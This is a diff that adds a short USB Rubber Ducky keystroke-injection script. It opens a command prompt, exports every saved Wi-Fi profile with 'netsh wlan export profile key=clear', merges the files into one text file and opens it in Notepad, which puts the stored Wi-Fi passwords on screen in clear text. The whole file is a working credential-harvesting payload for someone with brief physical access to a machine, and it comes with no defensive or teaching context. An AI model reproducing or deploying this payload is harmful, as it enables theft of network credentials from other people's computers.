@@ -1,0 +1,27 @@
+DUCKY_LANG DE
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+DELAY 500
+ENTER
+DELAY 1000
+STRING cd Desktop
+ENTER
+DELAY 1000
+STRING mkdir WLAN-Profiles
+ENTER
+DELAY 1000
+STRING cd WLAN-Profiles
+ENTER
+DELAY 1000
+STRING netsh wlan export profile key=clear
+ENTER
+DELAY 1000  
+STRING powershell Get-Content *.xml > All-WLAN-Profiles.txt
+DELAY 1000
+ENTER
+DELAY 1000
+STRING notepad All-WLAN-Profiles.txt
+DELAY 1000
+ENTER
